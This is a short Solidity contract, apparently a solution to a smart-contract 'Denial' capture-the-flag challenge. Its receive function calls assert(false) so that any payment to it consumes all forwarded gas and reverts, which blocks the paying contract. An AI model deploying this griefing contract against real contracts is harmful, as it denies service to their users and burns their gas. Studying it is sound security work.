pragma solidity ^0.6.0;

contract DenialAttack { 
    receive() external payable { 
        // three ways to throw an error (require(condition,"an error"), revert("an error", and assert(false))
        // assert does not refund gas
        assert(false); 
    } 
}